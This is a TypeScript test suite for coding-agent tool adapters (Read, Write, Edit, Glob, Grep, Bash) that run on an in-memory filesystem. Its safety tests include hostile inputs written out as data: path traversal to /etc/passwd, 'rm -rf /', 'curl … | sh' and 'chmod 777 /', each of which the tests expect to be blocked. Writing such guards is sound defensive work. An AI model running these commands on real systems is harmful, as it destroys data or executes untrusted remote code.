/**
 * Tool Adapters Test Suite
 *
 * Tests for Claude Code tool adapters that map to fsx.do/bashx.do capabilities.
 * Following TDD approach with comprehensive test coverage.
 *
 * @module lib/agent/tools/tests
 */

import { describe, it, expect, beforeEach } from 'vitest'
import {
  ReadToolAdapter,
  WriteToolAdapter,
  EditToolAdapter,
  GlobToolAdapter,
  GrepToolAdapter,
  BashToolAdapter,
  createToolContext,
  getAllToolAdapters,
  getToolAdapter,
  executeTool,
  FileNotFoundError,
  IsDirectoryError,
  PathTraversalError,
  NotUniqueError,
  FileNotReadError,
  PermissionError,
  type ToolContext,
} from '../index'
import { FSx, MemoryBackend } from '../../../../primitives/fsx/core'

// ============================================================================
// TEST SETUP
// ============================================================================

/**
 * Create a test context with an in-memory filesystem
 */
function createTestContext(): { fs: FSx; context: ToolContext; backend: MemoryBackend } {
  const backend = new MemoryBackend()
  const fs = new FSx(backend)
  const context = createToolContext(fs, { cwd: '/' })
  return { fs, context, backend }
}

/**
 * Setup a test filesystem with common files
 */
async function setupTestFilesystem(fs: FSx): Promise<void> {
  // Create directories
  await fs.mkdir('/src', { recursive: true })
  await fs.mkdir('/src/utils', { recursive: true })
  await fs.mkdir('/src/components', { recursive: true })
  await fs.mkdir('/test', { recursive: true })
  await fs.mkdir('/.hidden', { recursive: true })

  // Create files
  await fs.writeFile('/README.md', '# Test Project\n\nThis is a test project.')
  await fs.writeFile('/package.json', '{"name": "test", "version": "1.0.0"}')
  await fs.writeFile('/src/index.ts', 'export const main = () => console.log("Hello")')
  await fs.writeFile('/src/utils/helpers.ts', `// TODO: refactor
export function helper() {
  return "helper"
}
`)
  await fs.writeFile('/src/utils/format.ts', 'export function format(s: string) { return s.trim() }')
  await fs.writeFile('/src/components/Button.tsx', 'export const Button = () => <button>Click</button>')
  await fs.writeFile('/test/index.test.ts', 'describe("test", () => { it("works", () => {}) })')
  await fs.writeFile('/.hidden/secrets.txt', 'secret data')
  await fs.writeFile('/.gitignore', 'node_modules\ndist')
}

// ============================================================================
// READ TOOL TESTS
// ============================================================================

describe('ReadToolAdapter', () => {
  const adapter = new ReadToolAdapter()
  let fs: FSx
  let context: ToolContext

  beforeEach(async () => {
    const test = createTestContext()
    fs = test.fs
    context = test.context
    await setupTestFilesystem(fs)
  })

  it('has correct name and description', () => {
    expect(adapter.name).toBe('Read')
    expect(adapter.description).toContain('Reads a file')
  })

  it('reads text file content', async () => {
    const result = await adapter.execute({ file_path: '/README.md' }, context)
    expect(result.content).toContain('Test Project')
    expect(result.truncated).toBe(false)
  })

  it('returns content with line numbers', async () => {
    const result = await adapter.execute({ file_path: '/README.md' }, context)
    expect(result.content).toContain('1\t')
    expect(result.content).toMatch(/^\s*1\t/)
  })

  it('tracks read files for Edit validation', async () => {
    await adapter.execute({ file_path: '/README.md' }, context)
    expect(context.readFiles.has('/README.md')).toBe(true)
  })

  it('supports offset and limit', async () => {
    // Create a file with multiple lines
    await fs.writeFile('/multiline.txt', 'line1\nline2\nline3\nline4\nline5')

    const result = await adapter.execute(
      { file_path: '/multiline.txt', offset: 2, limit: 2 },
      context
    )

    expect(result.content).toContain('line2')
    expect(result.content).toContain('line3')
    expect(result.content).not.toContain('line1')
    expect(result.content).not.toContain('line4')
    expect(result.total_lines).toBe(5)
  })

  it('throws FileNotFoundError for non-existent files', async () => {
    await expect(
      adapter.execute({ file_path: '/nonexistent.txt' }, context)
    ).rejects.toThrow(FileNotFoundError)
  })

  it('throws IsDirectoryError for directories', async () => {
    await expect(
      adapter.execute({ file_path: '/src' }, context)
    ).rejects.toThrow(IsDirectoryError)
  })

  it('throws PathTraversalError for relative paths', async () => {
    await expect(
      adapter.execute({ file_path: 'relative/path.txt' }, context)
    ).rejects.toThrow(PathTraversalError)
  })

  it('throws PathTraversalError for path traversal attempts', async () => {
    await expect(
      adapter.execute({ file_path: '/src/../../etc/passwd' }, context)
    ).rejects.toThrow(PathTraversalError)
  })

  it('handles empty files', async () => {
    await fs.writeFile('/empty.txt', '')
    const result = await adapter.execute({ file_path: '/empty.txt' }, context)
    expect(result.total_lines).toBe(1) // Empty file has 1 empty line
  })
})

// ============================================================================
// WRITE TOOL TESTS
// ============================================================================

describe('WriteToolAdapter', () => {
  const adapter = new WriteToolAdapter()
  let fs: FSx
  let context: ToolContext

  beforeEach(async () => {
    const test = createTestContext()
    fs = test.fs
    context = test.context
    await setupTestFilesystem(fs)
  })

  it('has correct name and description', () => {
    expect(adapter.name).toBe('Write')
    expect(adapter.description).toContain('Writes a file')
  })

  it('writes new file', async () => {
    const result = await adapter.execute(
      { file_path: '/new-file.txt', content: 'Hello, World!' },
      context
    )

    expect(result.success).toBe(true)
    expect(result.bytes_written).toBe(13)

    const content = await fs.readFile('/new-file.txt')
    expect(content).toBe('Hello, World!')
  })

  it('overwrites existing file', async () => {
    const result = await adapter.execute(
      { file_path: '/README.md', content: 'New content' },
      context
    )

    expect(result.success).toBe(true)

    const content = await fs.readFile('/README.md')
    expect(content).toBe('New content')
  })

  it('creates parent directories', async () => {
    const result = await adapter.execute(
      { file_path: '/new/nested/dir/file.txt', content: 'nested content' },
      context
    )

    expect(result.success).toBe(true)

    const exists = await fs.exists('/new/nested/dir/file.txt')
    expect(exists).toBe(true)
  })

  it('throws IsDirectoryError when writing to directory', async () => {
    await expect(
      adapter.execute({ file_path: '/src', content: 'test' }, context)
    ).rejects.toThrow(IsDirectoryError)
  })

  it('throws PathTraversalError for relative paths', async () => {
    await expect(
      adapter.execute({ file_path: 'relative.txt', content: 'test' }, context)
    ).rejects.toThrow(PathTraversalError)
  })

  it('throws PermissionError for dangerous paths', async () => {
    await expect(
      adapter.execute({ file_path: '/etc/passwd', content: 'test' }, context)
    ).rejects.toThrow(PermissionError)
  })

  it('tracks written files in readFiles', async () => {
    await adapter.execute(
      { file_path: '/new-file.txt', content: 'test' },
      context
    )

    expect(context.readFiles.has('/new-file.txt')).toBe(true)
  })

  it('handles empty content', async () => {
    const result = await adapter.execute(
      { file_path: '/empty.txt', content: '' },
      context
    )

    expect(result.success).toBe(true)
    expect(result.bytes_written).toBe(0)
  })
})

// ============================================================================
// EDIT TOOL TESTS
// ============================================================================

describe('EditToolAdapter', () => {
  const adapter = new EditToolAdapter()
  const readAdapter = new ReadToolAdapter()
  let fs: FSx
  let context: ToolContext

  beforeEach(async () => {
    const test = createTestContext()
    fs = test.fs
    context = test.context
    await setupTestFilesystem(fs)
  })

  it('has correct name and description', () => {
    expect(adapter.name).toBe('Edit')
    expect(adapter.description).toContain('string replacements')
  })

  it('replaces unique string', async () => {
    // Read the file first
    await readAdapter.execute({ file_path: '/README.md' }, context)

    const result = await adapter.execute(
      {
        file_path: '/README.md',
        old_string: 'Test Project',
        new_string: 'Updated Project',
      },
      context
    )

    expect(result.success).toBe(true)
    expect(result.replacements_made).toBe(1)

    const content = await fs.readFile('/README.md')
    expect(content).toContain('Updated Project')
  })

  it('throws FileNotReadError if file was not read first', async () => {
    await expect(
      adapter.execute(
        {
          file_path: '/README.md',
          old_string: 'Test',
          new_string: 'Updated',
        },
        context
      )
    ).rejects.toThrow(FileNotReadError)
  })

  it('throws NotUniqueError for non-unique strings', async () => {
    // Create a file with duplicate strings
    await fs.writeFile('/dupe.txt', 'hello hello hello')
    await readAdapter.execute({ file_path: '/dupe.txt' }, context)

    await expect(
      adapter.execute(
        {
          file_path: '/dupe.txt',
          old_string: 'hello',
          new_string: 'world',
        },
        context
      )
    ).rejects.toThrow(NotUniqueError)
  })

  it('replaces all occurrences with replace_all', async () => {
    await fs.writeFile('/dupe.txt', 'hello hello hello')
    await readAdapter.execute({ file_path: '/dupe.txt' }, context)

    const result = await adapter.execute(
      {
        file_path: '/dupe.txt',
        old_string: 'hello',
        new_string: 'world',
        replace_all: true,
      },
      context
    )

    expect(result.success).toBe(true)
    expect(result.replacements_made).toBe(3)

    const content = await fs.readFile('/dupe.txt')
    expect(content).toBe('world world world')
  })

  it('returns undo information', async () => {
    await readAdapter.execute({ file_path: '/README.md' }, context)

    const result = await adapter.execute(
      {
        file_path: '/README.md',
        old_string: 'Test Project',
        new_string: 'Updated Project',
      },
      context
    )

    expect(result.undo).toEqual({
      old_string: 'Updated Project',
      new_string: 'Test Project',
    })
  })

  it('returns failure if string not found', async () => {
    await readAdapter.execute({ file_path: '/README.md' }, context)

    const result = await adapter.execute(
      {
        file_path: '/README.md',
        old_string: 'nonexistent string',
        new_string: 'replacement',
      },
      context
    )

    expect(result.success).toBe(false)
    expect(result.replacements_made).toBe(0)
  })

  it('preserves whitespace and indentation', async () => {
    await readAdapter.execute({ file_path: '/src/utils/helpers.ts' }, context)

    const result = await adapter.execute(
      {
        file_path: '/src/utils/helpers.ts',
        old_string: '  return "helper"',
        new_string: '  return "modified"',
      },
      context
    )

    expect(result.success).toBe(true)

    const content = await fs.readFile('/src/utils/helpers.ts')
    expect(content).toContain('  return "modified"')
  })
})

// ============================================================================
// GLOB TOOL TESTS
// ============================================================================

describe('GlobToolAdapter', () => {
  const adapter = new GlobToolAdapter()
  let fs: FSx
  let context: ToolContext

  beforeEach(async () => {
    const test = createTestContext()
    fs = test.fs
    context = test.context
    await setupTestFilesystem(fs)
  })

  it('has correct name and description', () => {
    expect(adapter.name).toBe('Glob')
    expect(adapter.description).toContain('pattern matching')
  })

  it('finds TypeScript files', async () => {
    const result = await adapter.execute({ pattern: '**/*.ts' }, context)

    expect(result.files).toContain('/src/index.ts')
    expect(result.files).toContain('/src/utils/helpers.ts')
    expect(result.files).toContain('/test/index.test.ts')
  })

  it('finds TSX files', async () => {
    const result = await adapter.execute({ pattern: '**/*.tsx' }, context)

    expect(result.files).toContain('/src/components/Button.tsx')
  })

  it('supports path parameter', async () => {
    const result = await adapter.execute(
      { pattern: '*.ts', path: '/src/utils' },
      context
    )

    expect(result.files.length).toBeGreaterThanOrEqual(0)
    // Files should be under /src/utils
    for (const file of result.files) {
      expect(file.startsWith('/src/utils')).toBe(true)
    }
  })

  it('returns empty array for no matches', async () => {
    const result = await adapter.execute({ pattern: '**/*.xyz' }, context)
    expect(result.files).toEqual([])
    expect(result.truncated).toBe(false)
  })

  it('returns empty array for non-existent path', async () => {
    const result = await adapter.execute(
      { pattern: '**/*', path: '/nonexistent' },
      context
    )
    expect(result.files).toEqual([])
  })

  it('sorts by mtime (most recent first)', async () => {
    // Create files with different mtimes
    await fs.writeFile('/recent.ts', 'recent')
    // Note: In MemoryBackend, we can't easily control mtime
    // This test verifies the structure is correct
    const result = await adapter.execute({ pattern: '*.ts', path: '/' }, context)
    expect(Array.isArray(result.files)).toBe(true)
  })
})

// ============================================================================
// GREP TOOL TESTS
// ============================================================================

describe('GrepToolAdapter', () => {
  const adapter = new GrepToolAdapter()
  let fs: FSx
  let context: ToolContext

  beforeEach(async () => {
    const test = createTestContext()
    fs = test.fs
    context = test.context
    await setupTestFilesystem(fs)
  })

  it('has correct name and description', () => {
    expect(adapter.name).toBe('Grep')
    expect(adapter.description).toContain('search')
  })

  it('finds simple pattern', async () => {
    const result = await adapter.execute(
      { pattern: 'TODO' },
      context
    )

    expect(result.matches.length).toBeGreaterThan(0)
    expect(result.matches.some(m => m.file.includes('helpers.ts'))).toBe(true)
  })

  it('supports regex patterns', async () => {
    const result = await adapter.execute(
      { pattern: 'export\\s+const', output_mode: 'files_with_matches' },
      context
    )

    expect(result.matches.length).toBeGreaterThan(0)
  })

  it('supports case insensitive search', async () => {
    const result = await adapter.execute(
      { pattern: 'todo', '-i': true },
      context
    )

    expect(result.matches.length).toBeGreaterThan(0)
  })

  it('returns file paths in files_with_matches mode', async () => {
    const result = await adapter.execute(
      { pattern: 'function', output_mode: 'files_with_matches' },
      context
    )

    expect(result.matches.every(m => m.file && !m.content)).toBe(true)
  })

  it('returns counts in count mode', async () => {
    const result = await adapter.execute(
      { pattern: 'export', output_mode: 'count' },
      context
    )

    expect(result.matches.every(m => typeof m.count === 'number')).toBe(true)
  })

  it('returns content with line numbers', async () => {
    const result = await adapter.execute(
      { pattern: 'TODO', output_mode: 'content', '-n': true },
      context
    )

    expect(result.matches.some(m => m.line !== undefined)).toBe(true)
    expect(result.matches.some(m => m.content !== undefined)).toBe(true)
  })

  it('supports glob filter', async () => {
    const result = await adapter.execute(
      { pattern: 'export', glob: '*.ts' },
      context
    )

    expect(result.matches.every(m => m.file.endsWith('.ts'))).toBe(true)
  })

  it('supports type filter', async () => {
    const result = await adapter.execute(
      { pattern: 'function', type: 'ts' },
      context
    )

    // All matches should be in TypeScript files
    for (const match of result.matches) {
      expect(
        match.file.endsWith('.ts') || match.file.endsWith('.tsx')
      ).toBe(true)
    }
  })

  it('returns empty for no matches', async () => {
    const result = await adapter.execute(
      { pattern: 'xyznonexistent123' },
      context
    )

    expect(result.matches).toEqual([])
  })

  it('supports head_limit', async () => {
    const result = await adapter.execute(
      { pattern: 'export', head_limit: 2 },
      context
    )

    expect(result.matches.length).toBeLessThanOrEqual(2)
  })
})

// ============================================================================
// BASH TOOL TESTS
// ============================================================================

describe('BashToolAdapter', () => {
  const adapter = new BashToolAdapter()
  let fs: FSx
  let context: ToolContext

  beforeEach(async () => {
    const test = createTestContext()
    fs = test.fs
    context = test.context
    await setupTestFilesystem(fs)
  })

  it('has correct name and description', () => {
    expect(adapter.name).toBe('Bash')
    expect(adapter.description).toContain('bash command')
  })

  describe('Tier 1 - Native commands', () => {
    it('executes pwd', async () => {
      const result = await adapter.execute({ command: 'pwd' }, context)
      expect(result.stdout).toBe('/')
      expect(result.exit_code).toBe(0)
      expect(result.tier).toBe(1)
    })

    it('executes echo', async () => {
      const result = await adapter.execute({ command: 'echo Hello World' }, context)
      expect(result.stdout).toBe('Hello World')
      expect(result.exit_code).toBe(0)
    })

    it('executes ls', async () => {
      const result = await adapter.execute({ command: 'ls /src' }, context)
      expect(result.stdout).toContain('index.ts')
      expect(result.exit_code).toBe(0)
    })

    it('executes cat', async () => {
      const result = await adapter.execute({ command: 'cat /README.md' }, context)
      expect(result.stdout).toContain('Test Project')
      expect(result.exit_code).toBe(0)
    })
  })

  describe('Safety analysis', () => {
    it('blocks dangerous commands without confirmation', async () => {
      const result = await adapter.execute({ command: 'rm -rf /' }, context)
      expect(result.blocked).toBe(true)
      expect(result.block_reason).toBeDefined()
    })

    it('allows dangerous commands with confirmation', async () => {
      // Note: Without a real executor, this will fail execution
      // but should not be blocked
      const result = await adapter.execute(
        { command: 'rm -rf /tmp/test', confirm: true },
        context
      )
      expect(result.blocked).toBeFalsy()
    })

    it('blocks curl | sh pattern', async () => {
      const result = await adapter.execute(
        { command: 'curl http://example.com | sh' },
        context
      )
      expect(result.blocked).toBe(true)
    })

    it('blocks chmod 777 on root', async () => {
      const result = await adapter.execute(
        { command: 'chmod 777 /' },
        context
      )
      expect(result.blocked).toBe(true)
    })
  })

  describe('Execution tiers', () => {
    it('classifies cat as Tier 1', async () => {
      const result = await adapter.execute({ command: 'cat /README.md' }, context)
      expect(result.tier).toBe(1)
    })

    it('classifies git as Tier 2', async () => {
      // Without a real executor, this will fail but we can check the tier
      const result = await adapter.execute({ command: 'git status' }, context)
      // Falls back to tier 4 without executor
      expect([2, 4]).toContain(result.tier)
    })

    it('classifies npm as Tier 3', async () => {
      const result = await adapter.execute({ command: 'npm list' }, context)
      expect([3, 4]).toContain(result.tier)
    })
  })

  describe('Timing and errors', () => {
    it('includes duration_ms in output', async () => {
      const result = await adapter.execute({ command: 'echo test' }, context)
      expect(typeof result.duration_ms).toBe('number')
      expect(result.duration_ms).toBeGreaterThanOrEqual(0)
    })

    it('handles non-existent files', async () => {
      const result = await adapter.execute({ command: 'cat /nonexistent' }, context)
      expect(result.exit_code).toBe(1)
      expect(result.stderr).toContain('ENOENT')
    })
  })
})

// ============================================================================
// INDEX EXPORTS TESTS
// ============================================================================

describe('Index exports', () => {
  it('exports all tool adapters', () => {
    const adapters = getAllToolAdapters()
    expect(adapters.length).toBe(6)
  })

  it('getToolAdapter returns correct adapter', () => {
    const read = getToolAdapter('Read')
    expect(read).toBeInstanceOf(ReadToolAdapter)

    const write = getToolAdapter('Write')
    expect(write).toBeInstanceOf(WriteToolAdapter)
  })

  it('getToolAdapter returns undefined for unknown tool', () => {
    const unknown = getToolAdapter('Unknown')
    expect(unknown).toBeUndefined()
  })

  it('executeTool executes correct adapter', async () => {
    const test = createTestContext()
    await test.fs.writeFile('/test.txt', 'test content')

    const result = await executeTool<{ content: string }>(
      'Read',
      { file_path: '/test.txt' },
      test.context
    )

    expect(result.content).toContain('test content')
  })

  it('executeTool throws for unknown tool', async () => {
    const test = createTestContext()

    await expect(
      executeTool('Unknown', {}, test.context)
    ).rejects.toThrow('Unknown tool')
  })

  it('createToolContext creates valid context', () => {
    const test = createTestContext()
    const ctx = createToolContext(test.fs, {
      cwd: '/home',
      env: { FOO: 'bar' },
    })

    expect(ctx.cwd).toBe('/home')
    expect(ctx.env?.FOO).toBe('bar')
    expect(ctx.readFiles).toBeInstanceOf(Set)
  })
})
